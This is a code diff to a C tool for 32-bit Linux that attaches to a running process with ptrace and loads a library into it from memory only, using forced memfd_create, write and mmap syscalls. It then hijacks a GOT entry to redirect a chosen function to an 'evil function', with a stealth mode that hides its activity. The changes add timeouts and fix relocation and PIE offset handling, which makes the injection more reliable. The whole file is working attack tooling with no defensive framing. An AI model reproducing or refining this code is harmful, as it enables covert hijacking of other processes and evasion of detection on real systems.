@@ -1,3 +1,4 @@
+#define _LARGEFILE64_SOURCE
 #include <ctype.h>
 #include <elf.h>
 #include <errno.h>
@@ -13,7 +14,10 @@
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
+#include <sys/time.h>
+#include <sys/select.h>
 #include <signal.h>
+#include <time.h>
 #include <unistd.h>
 #include "ae_log.h"
 
@@ -28,6 +32,11 @@ typedef unsigned char uchar_t;
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
 #endif
+
+/* Timeout constants */
+#define SINGLESTEP_TIMEOUT_SEC 5
+#define WAITPID_TIMEOUT_SEC 10
+#define MAX_SINGLESTEP_ITERATIONS 20
 
 /* memfd_create syscall number for x86_32 */
 #ifndef SYS_memfd_create
@@ -79,6 +88,7 @@ struct ae_segments {
 
 static ulong_t ae_original;
 static ulong_t ae_text_base;
+static ulong_t ae_text_base_original;  /* Original ELF text base for GOT calculations */
 static ulong_t ae_data_base;
 static bool ae_stealth_mode = false;
 
@@ -90,8 +100,162 @@ static ulong_t ae_find_sysenter(int pid, ulong_t start, ulong_t end, size_t max_
 static void ae_show_progress_bar(ulong_t current, ulong_t total, const char * status, int done);
 static inline void ae_ptrace_cpy_from(ulong_t * dst, ulong_t src, size_t size, int pid);
 static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);
+static int ae_waitpid_with_timeout(pid_t pid, int *status, int timeout_sec, const char *context);
+static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec, const char *context, unsigned int syscall_number, unsigned int *result);
 
 /* --- Helper implementations --- */
+/* Wait for process with timeout using select() */
+static int ae_waitpid_with_timeout(pid_t pid, int *status, int timeout_sec, const char *context) {
+    struct timeval start_time, current_time;
+    gettimeofday(&start_time, NULL);
+    
+    if (!ae_stealth_mode && context)
+        ae_log(AE_LOG_DEBUG, "[TIMEOUT] Waiting for PID %d (%s), timeout: %d sec", pid, context, timeout_sec);
+    
+    while (1) {
+        pid_t result = waitpid(pid, status, WNOHANG);
+        
+        if (result == pid) {
+            if (!ae_stealth_mode)
+                ae_log(AE_LOG_DEBUG, "[TIMEOUT] waitpid succeeded for PID %d", pid);
+            return result;
+        }
+        
+        if (result == -1 && errno != ECHILD) {
+            ae_log(AE_LOG_ERROR, "[TIMEOUT] waitpid failed for PID %d: %s", pid, strerror(errno));
+            return -1;
+        }
+        
+        /* Check timeout */
+        gettimeofday(&current_time, NULL);
+        double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
+                        (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
+        
+        if (elapsed >= timeout_sec) {
+            ae_log(AE_LOG_ERROR, "[TIMEOUT] waitpid timeout after %.2f seconds for PID %d (%s)", 
+                   elapsed, pid, context ? context : "unknown");
+            return 0; /* Timeout */
+        }
+        
+        /* Sleep briefly to avoid busy-waiting */
+        usleep(10000); /* 10ms */
+    }
+}
+
+/* Single-step with timeout and syscall completion detection */
+static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec,
+                                      const char *context, unsigned int syscall_number, unsigned int *result) {
+    struct timeval start_time, current_time;
+    gettimeofday(&start_time, NULL);
+    int step_status;
+    struct user_regs_struct reg;
+    int iteration = 0;
+    int syscall_started = 0;
+    unsigned int initial_eax = 0;
+
+    if (!ae_stealth_mode)
+        ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Starting single-step for %s (syscall: %u, max_iterations: %d, timeout: %d sec)",
+               context ? context : "unknown", syscall_number, max_iterations, timeout_sec);
+
+    for (iteration = 0; iteration < max_iterations; iteration++) {
+        /* Check timeout before each iteration */
+        gettimeofday(&current_time, NULL);
+        double elapsed = (current_time.tv_sec - start_time.tv_sec) +
+                        (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
+
+        if (elapsed >= timeout_sec) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Timeout after %.2f seconds at iteration %d (%s)",
+                   elapsed, iteration, context ? context : "unknown");
+            return -1;
+        }
+
+        if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] PTRACE_SINGLESTEP failed at iteration %d: %s",
+                   iteration, strerror(errno));
+            return -1;
+        }
+
+        /* Wait for single-step with timeout */
+        pid_t wait_result = ae_waitpid_with_timeout(pid, &step_status, timeout_sec,
+                                                     context ? context : "single-step");
+
+        if (wait_result == 0) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] waitpid timeout at iteration %d", iteration);
+            return -1;
+        }
+
+        if (wait_result == -1) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] waitpid failed at iteration %d: %s",
+                   iteration, strerror(errno));
+            return -1;
+        }
+
+        if (wait_result != pid) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] waitpid returned unexpected PID: %d (expected: %d)",
+                   wait_result, pid);
+            return -1;
+        }
+
+        /* Validate process status */
+        if (WIFEXITED(step_status)) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Process exited during iteration %d (exit status: %d)",
+                   iteration, WEXITSTATUS(step_status));
+            return -1;
+        }
+
+        if (WIFSIGNALED(step_status)) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Process killed during iteration %d (signal: %d)",
+                   iteration, WTERMSIG(step_status));
+            return -1;
+        }
+
+        if (!WIFSTOPPED(step_status)) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Unexpected wait status 0x%x at iteration %d (not stopped)",
+                   step_status, iteration);
+            return -1;
+        }
+
+        /* Get registers to check syscall completion */
+        if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
+            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Failed to get registers at iteration %d: %s",
+                   iteration, strerror(errno));
+            return -1;
+        }
+
+        /* Detect syscall start and completion */
+        if (!syscall_started) {
+            /* Check if we're at the start of syscall (EAX contains syscall number) */
+            if ((unsigned int)reg.eax == syscall_number) {
+                syscall_started = 1;
+                initial_eax = reg.eax;
+                if (!ae_stealth_mode)
+                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u started at iteration %d (EIP: 0x%lx)",
+                           syscall_number, iteration, reg.eip);
+            }
+        } else {
+            /* Check if syscall completed by detecting return to user space */
+            /* Kernel addresses are typically high (0xf7xxxxxx), user addresses are lower */
+            int in_kernel = (reg.eip & 0xff000000) == 0xf7000000; /* Linux kernel address range */
+
+            if (!in_kernel && (unsigned int)reg.eax != syscall_number) {
+                /* Syscall completed - we're back in user space with different EAX */
+                *result = (unsigned int)reg.eax;
+                if (!ae_stealth_mode)
+                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u completed at iteration %d: result=0x%x (EIP: 0x%lx)",
+                           syscall_number, iteration, *result, reg.eip);
+                return 0;
+            }
+        }
+
+        if (!ae_stealth_mode && (iteration % 5 == 0 || iteration < 3))
+            ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Iteration %d: EAX=0x%x, EIP=0x%lx",
+                   iteration, reg.eax, reg.eip);
+    }
+
+    ae_log(AE_LOG_ERROR, "[SINGLESTEP] Syscall %u did not complete within %d iterations", syscall_number, max_iterations);
+    return -1;
+}
+
 static int ae_is_address_mapped(int pid, ulong_t addr, size_t size) {
     char maps_path[64];
     snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
@@ -131,7 +295,7 @@ static int ae_ensure_stopped(int pid) {
             /* State is the 3rd field in /proc/pid/stat (after the ')' from process name) */
             char *state = strchr(stat_line, ')');
             if (state && (state[2] == 'T' || state[2] == 't')) {
-                /* Process is already stopped */
+                /* Process is already stopped - no need to send SIGSTOP or wait */
                 fclose(stat_file);
                 return 0;
             }
@@ -206,7 +370,7 @@ ae_read_library_file (char * libname, size_t * lib_size)
 {
 	char libpath[MAXBUF];
 	int fd;
-	struct stat st;
+	struct stat64 st;
 	uchar_t * buf = NULL;
 	ssize_t bytes_read;
 
@@ -218,7 +382,7 @@ ae_read_library_file (char * libname, size_t * lib_size)
 		return NULL;
 	}
 
-	if (fstat(fd, &st) < 0) {
+	if (fstat64(fd, &st) < 0) {
 		ae_log(AE_LOG_ERROR, "Could not stat library file");
 		close(fd);
 		return NULL;
@@ -256,15 +420,11 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 	char saved_data[MAXBUF];
 	size_t name_len = strlen(name) + 1;
 
-	/* Ensure process is stopped by sending a signal and waiting */
-	int status;
-	if (kill(pid, SIGSTOP) == -1) {
-		ae_log(AE_LOG_ERROR, "Failed to send SIGSTOP: %s", strerror(errno));
-	}
-	waitpid(pid, &status, WUNTRACED);
-	
-	if (!WIFSTOPPED(status)) {
-		ae_log(AE_LOG_ERROR, "Process is not stopped (status: 0x%x)", status);
+	/* Ensure process is stopped - this function handles already-stopped processes */
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Ensuring process %d is stopped before memfd_create", pid);
+	if (ae_ensure_stopped(pid) == -1) {
+		ae_log(AE_LOG_ERROR, "Failed to ensure process is stopped: %s", strerror(errno));
 		return -1;
 	}
 	
@@ -325,12 +485,22 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 	}
 	
 	/* backup area where we'll store the memfd name */
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Backing up stack area at 0x%lx (size: %zu)", name_addr, name_len + 16);
 	ae_ptrace_cpy_from((ulong_t*)saved_data, name_addr, name_len + 16, pid);
+	if (errno != 0 && errno != EIO) {
+		ae_log(AE_LOG_ERROR, "Failed to backup stack area: %s", strerror(errno));
+		return -1;
+	}
 
 	/* write the memfd name to target's data segment */
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "Writing memfd name '%s' to 0x%lx", name, name_addr);
+		ae_log(AE_LOG_DEBUG, "Writing memfd name '%s' to 0x%lx (len: %zu)", name, name_addr, name_len);
 	ae_ptrace_cpy_to(name_addr, (ulong_t*)name, name_len, pid);
+	if (errno != 0) {
+		ae_log(AE_LOG_ERROR, "Failed to write memfd name: %s", strerror(errno));
+		return -1;
+	}
 	
 	/* Verify the write succeeded */
 	char verify_buf[MAXBUF] = {0};
@@ -351,6 +521,9 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 	long orig_eip = reg.eip;
 
 	/* setup memfd_create syscall: memfd_create(name, MFD_CLOEXEC) */
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Setting up memfd_create syscall: EAX=0x%x, EBX=0x%lx (name_addr), ECX=0x%x, EIP=0x%lx", 
+		       SYS_memfd_create, name_addr, MFD_CLOEXEC, sysenter);
 	reg.eax = SYS_memfd_create;
 	reg.ebx = name_addr;
 	reg.ecx = MFD_CLOEXEC;
@@ -361,24 +534,29 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
 		return -1;
 	}
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Registers set successfully, ready to execute syscall");
 
-	/* execute the syscall */
+	/* execute the syscall with timeout and detailed logging */
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Executing memfd_create syscall via single-step (sysenter: 0x%lx)", sysenter);
+	
 	int step_status;
-	for (i = 0; i < 10; i++) {
-		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
-			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed: %s", strerror(errno));
-			break;
-		}
-		waitpid(pid, &step_status, 0);
-		if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
-			ae_log(AE_LOG_ERROR, "Failed to get registers after step: %s", strerror(errno));
-			break;
-		}
-		if (reg.eax != SYS_memfd_create) {
-			memfd = (int)reg.eax;
-			break;
-		}
+	unsigned int memfd_result;
+	int singlestep_result = ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
+	                                                    SINGLESTEP_TIMEOUT_SEC,
+	                                                    "memfd_create", SYS_memfd_create, &memfd_result);
+
+	if (singlestep_result == -1) {
+		ae_log(AE_LOG_ERROR, "Single-step failed for memfd_create");
+		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
+		return -1;
 	}
+
+	/* The syscall completed successfully, result contains the memfd */
+	memfd = (int)memfd_result;
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "memfd_create syscall completed: result=0x%x (memfd=%d)", memfd_result, memfd);
 
 	if (memfd < 0) {
 		ae_log(AE_LOG_ERROR, "memfd_create failed: %d (errno: %s)", memfd, strerror(errno));
@@ -444,17 +622,17 @@ ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t 
 
 		ptrace(PTRACE_SETREGS, pid, NULL, &reg);
 
-		/* execute the syscall */
+		/* execute the syscall with timeout */
 		written = -1;
-		int step_status;
-		for (i = 0; i < 5; i++) {
-			ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
-			waitpid(pid, &step_status, 0);
-			ptrace(PTRACE_GETREGS, pid, NULL, &reg);
-			if (reg.eax != SYS_write) {
-				written = (ssize_t)reg.eax;
-				break;
-			}
+		unsigned int write_result;
+		char context_buf[64];
+		snprintf(context_buf, sizeof(context_buf), "write(memfd=%d, offset=%zu)", memfd, offset);
+
+		if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
+		                                  SINGLESTEP_TIMEOUT_SEC, context_buf, SYS_write, &write_result) == 0) {
+			written = (ssize_t)write_result;
+			if (!ae_stealth_mode)
+				ae_log(AE_LOG_DEBUG, "write syscall completed: wrote %ld bytes", written);
 		}
 
 		if (written != chunk_size) {
@@ -664,11 +842,15 @@ ae_phantom_load (int pid, char * libname, ulong_t sysenter, int * memfd_out)
 		ae_log(AE_LOG_DEBUG, "Created memfd %d in target process", memfd);
 
 	/* write library data to the memfd */
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Writing %zu bytes to memfd %d", lib_size, memfd);
 	if (ae_write_to_memfd(pid, sysenter, memfd, lib_data, lib_size) < 0) {
 		ae_log(AE_LOG_ERROR, "Failed to write library to memfd");
 		free(lib_data);
 		return -1;
 	}
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Successfully wrote all %zu bytes to memfd", lib_size);
 
 	if (!ae_stealth_mode)
 		ae_log(AE_LOG_DEBUG, "Phantom Load complete: library loaded in RAM via memfd %d", memfd);
@@ -844,6 +1026,8 @@ ae_mmap_library (int pid,
 	}
 
 	// we force an open() of the memfd path /proc/self/fd/<memfd>
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Opening memfd path: %s", library_string);
 	reg.eax = SYS_open;
 	reg.ebx = (long)string_addr;
 	reg.ecx = 0;  
@@ -854,23 +1038,14 @@ ae_mmap_library (int pid,
 		return -1;
 	}
 
-	// force the pseudo-syscall
+	// force the pseudo-syscall with timeout
 	fd = -1;
-	for (i = 0; i < 10; i++) {
-		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
-			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed for open: %s", strerror(errno));
-			break;
-		}
-		int step_status;
-		waitpid(pid, &step_status, 0);
-		if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
-			ae_log(AE_LOG_ERROR, "Failed to get registers after open step: %s", strerror(errno));
-			break;
-		}
-		if (reg.eax != SYS_open) {
-			fd = (int)reg.eax;
-			break;
-		}
+	unsigned int open_result;
+	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
+	                                SINGLESTEP_TIMEOUT_SEC, "open(memfd)", SYS_open, &open_result) == 0) {
+		fd = (int)open_result;
+		if (!ae_stealth_mode)
+			ae_log(AE_LOG_DEBUG, "open syscall completed: fd=%d", fd);
 	}
 	
 	if (fd < 0) {
@@ -899,22 +1074,20 @@ ae_mmap_library (int pid,
 		return -1;
 	}
 
-	// force the pseudo-syscall
+	// force the pseudo-syscall with timeout
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Executing mmap for text segment (size: %zu)",
+		       segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1))));
 	*evilbase = 0;
-	for (i = 0; i < 10; i++) {
-		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
-			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed for mmap: %s", strerror(errno));
-			break;
-		}
-		int step_status;
-		waitpid(pid, &step_status, 0);
-		if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
-			ae_log(AE_LOG_ERROR, "Failed to get registers after mmap step: %s", strerror(errno));
-			break;
-		}
-		if (reg.eax != SYS_mmap) {
-			*evilbase = reg.eax;
-			break;
+	unsigned int mmap_result;
+	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
+	                                SINGLESTEP_TIMEOUT_SEC, "mmap(text)", SYS_mmap, &mmap_result) == 0) {
+		if (mmap_result != (unsigned int)-1) {
+			*evilbase = mmap_result;
+			if (!ae_stealth_mode)
+				ae_log(AE_LOG_DEBUG, "mmap(text) completed: base=0x%lx", *evilbase);
+		} else {
+			ae_log(AE_LOG_ERROR, "mmap(text) failed: result=0x%x", mmap_result);
 		}
 	}
 	
@@ -940,14 +1113,17 @@ ae_mmap_library (int pid,
 		return -1;
 	}
 
-	// force the pseudo-syscall for data segment
-	for (i = 0; i < 10; i++) {
-		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
-			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed for data mmap: %s", strerror(errno));
-			break;
-		}
-		int step_status;
-		waitpid(pid, &step_status, 0);
+	// force the pseudo-syscall for data segment with timeout
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Executing mmap for data segment (size: %zu)",
+		       segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1))));
+	unsigned int mmap_data_result;
+	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
+	                                SINGLESTEP_TIMEOUT_SEC, "mmap(data)", SYS_mmap, &mmap_data_result) == 0) {
+		if (!ae_stealth_mode)
+			ae_log(AE_LOG_DEBUG, "mmap(data) completed: result=0x%x", mmap_data_result);
+	} else {
+		ae_log(AE_LOG_ERROR, "mmap(data) failed or timed out");
 	}
 
 	if (!ae_stealth_mode)
@@ -1026,9 +1202,11 @@ ae_get_plt (uchar_t * mem)
 
 			sinfo->count = symcount;
 
-			for (j = 0; j < symcount; j++, symsp++) {
-				strncpy(sinfo->syms[j].name, &symname[symsp->st_name], MAXBUF);
+			// Initialize all symbol offsets to 0
+			for (j = 0; j < symcount; j++) {
+				strncpy(sinfo->syms[j].name, &symname[symsp[j].st_name], MAXBUF);
 				sinfo->syms[j].index = j;
+				sinfo->syms[j].offset = 0;  // Initialize to 0
 			}
 
 			free(symname);
@@ -1037,18 +1215,38 @@ ae_get_plt (uchar_t * mem)
 		}
 	}
 
-	// associate relocation entires with symbols
+	// associate relocation entries with symbols
 	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
-		if (shdr->sh_type == SHT_REL) {
-			rel = (Elf32_Rel*)(mem + shdr->sh_offset);
-			for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
-				for (k = 0; k < symcount; k++) {
-					if (ELF32_R_SYM(rel->r_info) == sinfo->syms[k].index) 
-						sinfo->syms[k].offset = rel->r_offset;
+		if (shdr->sh_type == SHT_REL || shdr->sh_type == SHT_RELA) {
+			if (shdr->sh_type == SHT_REL) {
+				rel = (Elf32_Rel*)(mem + shdr->sh_offset);
+				for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
+					// Check if this is a JUMP_SLOT relocation (PLT entry)
+					if (ELF32_R_TYPE(rel->r_info) == R_386_JMP_SLOT) {
+						for (k = 0; k < symcount; k++) {
+							if (ELF32_R_SYM(rel->r_info) == sinfo->syms[k].index)
+								sinfo->syms[k].offset = rel->r_offset;
+						}
+					}
 				}
+			} else {
+				// SHT_RELA handling would go here if needed
+				ae_log(AE_LOG_DEBUG, "Found SHT_RELA section (not handled)");
 			}
 		}
 	}
+
+	// Filter symbols to only include those with PLT entries (non-zero offsets)
+	int valid_count = 0;
+	for (i = 0; i < symcount; i++) {
+		if (sinfo->syms[i].offset != 0) {
+			if (valid_count != i) {
+				sinfo->syms[valid_count] = sinfo->syms[i];
+			}
+			valid_count++;
+		}
+	}
+	sinfo->count = valid_count;
 
 	return sinfo;
 }
@@ -1165,21 +1363,49 @@ ae_patch_got (struct ae_opts * opt, struct ae_sym_info * sinfo, ulong_t lib_base
 	
 	// overwrite GOT entry with addr of evilfunc (our replacement)
 	for (int i = 0; i < sinfo->count; i++) {
-		if (strcmp(sinfo->syms[i].name, opt->func) == 0) {
+		if (strcmp(sinfo->syms[i].name, opt->func) == 0 && sinfo->syms[i].offset != 0) {
 
-			if (!opt->stealth)
+			if (!opt->stealth) {
 				ae_log(AE_LOG_DEBUG, "Found string <%s> to patch", sinfo->syms[i].name);
+				ae_log(AE_LOG_DEBUG, "Symbol offset: 0x%x, lib_base: 0x%lx, ae_text_base: 0x%lx, ae_text_base_original: 0x%lx",
+					   sinfo->syms[i].offset, lib_base, ae_text_base, ae_text_base_original);
+			}
 
 			if (is_pie) {
-				got_offset = (lib_base + (sinfo->syms[i].offset - ae_text_base));
+				got_offset = (lib_base + (sinfo->syms[i].offset - ae_text_base_original));
+				if (!opt->stealth)
+					ae_log(AE_LOG_DEBUG, "PIE GOT calculation: lib_base(0x%lx) + (offset(0x%x) - ae_text_base_original(0x%lx)) = 0x%lx",
+						   lib_base, sinfo->syms[i].offset, ae_text_base_original, got_offset);
 			} else {
 				got_offset = sinfo->syms[i].offset;
 			}
 
+			if (!opt->stealth)
+				ae_log(AE_LOG_DEBUG, "Calculated GOT offset: 0x%lx", got_offset);
+
 			ae_original = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
+			if (!opt->stealth)
+				ae_log(AE_LOG_DEBUG, "Original GOT value: 0x%lx", ae_original);
+
 			ptrace(PTRACE_POKETEXT, opt->pid, got_offset, patch_val);
 			ret = ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
+
+			if (!opt->stealth)
+				ae_log(AE_LOG_DEBUG, "New GOT value: 0x%x", ret);
+
 			break;
+		}
+	}
+
+	if (!opt->stealth && ret == 0) {
+		ae_log(AE_LOG_DEBUG, "Symbol <%s> not found in %d symbols with relocations", opt->func, sinfo->count);
+		ae_log(AE_LOG_DEBUG, "Available symbols with GOT entries:");
+		int shown = 0;
+		for (int i = 0; i < sinfo->count && shown < 10; i++) {  // Show first 10 symbols with offsets
+			if (sinfo->syms[i].offset != 0) {
+				ae_log(AE_LOG_DEBUG, "  %s (offset: 0x%x)", sinfo->syms[i].name, sinfo->syms[i].offset);
+				shown++;
+			}
 		}
 	}
 	return ret;
@@ -1279,7 +1505,7 @@ ae_map_binary (int pid)
 {
 	char meminfo[MAXBUF] = {0};
 	char proc_status[MAXBUF];
-	struct stat st;
+	struct stat64 st;
 	int fd;
 	char * ret = NULL;
 	FILE *status_file;
@@ -1301,7 +1527,7 @@ ae_map_binary (int pid)
 		return MAP_FAILED;
 	}
 
-	if (fstat(fd, &st) < 0) {
+	if (fstat64(fd, &st) < 0) {
 		ae_log(AE_LOG_ERROR, "Could not stat binary: %s (fd=%d, pid=%d)", 
 		       strerror(errno), fd, pid);
 		close(fd);
@@ -1370,6 +1596,7 @@ ae_parse_headers (Elf32_Ehdr * ehdr, struct ae_segments * segs)
 			if (phdr->p_flags == (PF_X | PF_R)) {
 				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
 				ae_text_base = phdr->p_vaddr;
+				ae_text_base_original = phdr->p_vaddr;  /* Save original for GOT calculations */
 				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
 				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
 			}
@@ -1398,17 +1625,29 @@ ae_inject_lib (struct ae_opts * opt, ulong_t * evilbase, struct ae_segments * se
 	}
 
 	/* Re-attach for subsequent operations (searching for evil function, patching GOT) */
+	if (!opt->stealth)
+		ae_log(AE_LOG_DEBUG, "Re-attaching to process %d for GOT patching", opt->pid);
 	if (ptrace(PTRACE_ATTACH, opt->pid, NULL, NULL)) {
 		ae_log(AE_LOG_ERROR, "Could not attach");
 		return -1;
 	}
 
 	int status;
-	waitpid(opt->pid, &status, WUNTRACED);
-	if (!WIFSTOPPED(status)) {
-		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (inject_lib)");
+	pid_t wait_result = ae_waitpid_with_timeout(opt->pid, &status, WAITPID_TIMEOUT_SEC, "re-attach");
+	if (wait_result == 0) {
+		ae_log(AE_LOG_ERROR, "Timeout waiting for process to stop after re-attach");
 		return -1;
 	}
+	if (wait_result == -1) {
+		ae_log(AE_LOG_ERROR, "waitpid failed after re-attach: %s", strerror(errno));
+		return -1;
+	}
+	if (!WIFSTOPPED(status)) {
+		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (inject_lib), status: 0x%x", status);
+		return -1;
+	}
+	if (!opt->stealth)
+		ae_log(AE_LOG_DEBUG, "Successfully re-attached and process is stopped");
 
 	return 0;
 }
@@ -1503,17 +1742,31 @@ ae_attach (int pid)
 {
 	int status;
 
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Attaching to process %d", pid);
 	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
-		ae_log(AE_LOG_ERROR, "Failed to attach to process");
+		ae_log(AE_LOG_ERROR, "Failed to attach to process: %s", strerror(errno));
 		exit(EXIT_FAILURE);
 	}
-	waitpid(pid, &status, WUNTRACED);
+	
+	pid_t wait_result = ae_waitpid_with_timeout(pid, &status, WAITPID_TIMEOUT_SEC, "initial attach");
+	if (wait_result == 0) {
+		ae_log(AE_LOG_ERROR, "Timeout waiting for process to stop after attach");
+		exit(EXIT_FAILURE);
+	}
+	if (wait_result == -1) {
+		ae_log(AE_LOG_ERROR, "waitpid failed after attach: %s", strerror(errno));
+		exit(EXIT_FAILURE);
+	}
 	
 	/* Ensure process is stopped */
 	if (!WIFSTOPPED(status)) {
-		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (status: %d)", status);
+		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (status: 0x%x)", status);
 		exit(EXIT_FAILURE);
 	}
+	
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Successfully attached and process is stopped");
 	
 	/* Set ptrace options to ensure proper behavior */
 	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) == -1) {
@@ -1636,17 +1889,30 @@ main (int argc, char **argv)
 	}
 
 	/* inject library into process using phantom load (memory-only) */
+	if (!opt.stealth)
+		ae_log(AE_LOG_DEBUG, "Checking if library %s is already present in process", opt.libname);
 	if (ae_evil_lib_present(opt.libname, opt.pid)) {
 		ae_log(AE_LOG_ERROR, "Process %d already infected, %s is mmap'd already", opt.pid, opt.libname);
 		goto out_err;
 	} else {
-		ae_inject_lib(&opt, &evilbase, &segs);
+		if (!opt.stealth)
+			ae_log(AE_LOG_DEBUG, "Library not present, proceeding with injection");
+		if (ae_inject_lib(&opt, &evilbase, &segs) < 0) {
+			ae_log(AE_LOG_ERROR, "Library injection failed");
+			goto out_err;
+		}
+		if (!opt.stealth)
+			ae_log(AE_LOG_DEBUG, "Library injection completed, base address: 0x%lx", evilbase);
 	}
 
+	if (!opt.stealth)
+		ae_log(AE_LOG_DEBUG, "Searching for evil function in injected library (base: 0x%lx)", evilbase);
 	if ((evilfunc = ae_search_evil_lib(opt.pid, opt.libname, evilbase)) == 0) {
 		ae_log(AE_LOG_ERROR, "Could not locate evil function");
 		goto out_err;
 	}
+	if (!opt.stealth)
+		ae_log(AE_LOG_DEBUG, "Found evil function at address: 0x%lx", evilfunc);
 
 	if (!opt.stealth) {
 		ae_log(AE_LOG_DEBUG, "Evil function location: 0x%lx", evilfunc);
